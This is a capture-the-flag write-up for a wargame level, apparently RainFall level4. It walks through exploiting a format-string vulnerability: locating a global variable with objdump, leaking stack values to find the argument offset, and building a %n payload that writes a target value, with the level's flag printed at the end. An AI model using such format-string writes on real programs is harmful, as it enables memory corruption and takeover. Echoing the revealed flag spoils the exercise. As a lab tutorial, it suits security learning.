# Level4

You can find the decomp [here]("./level4_decomp.c"), it's the same theory as the last level, find a variable address and write the correct value there which will be `16930116`.

## Exploit

### m address

We can find it using `objdump -t`:

```bash
08049810 g     O .bss   00000004              m
```

### Finding its offset

We can use the fact that the program uses `printf(buff)` as in the previous level:

```bash
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%x " * 12' | ./level4
�b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 8049810
```

Here we can see that the address of `m` is at the 12th offset

### Building our payload

Our payload will look something like this:

`[m address] + [number to write] [offset\n]`

## Solution

<details>
  <summary>Spoiler</summary>

  We will right the address of `m` followed by `16930116 - 4(size of the address)` characters. `%16930112x` will write 16930112 characters that will then be treated by `%12$n` as, write the number of bytes we wrote as a number in the 12th arguments which is our `m` address.

  `%<n>$n` let's you write at the n offset of printf' var_args, in our case it let's us "skip" the popping of address to get to the right stack addr. Which also avoid to take the size of the written popped address we would have using `%x%x%x` (here we would have to take into account the length of the 3 address, which could be of different sizes as we saw in the example above when trying to find the offset). It's easier to understand/read while keeping us away from missing offset here and there...

  ```bash
  python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"'
  ```

  This will result in a ton of spaces, followed by:

  ```bash
  b7ff26b0
    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
  ```
</details>


## Flag

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a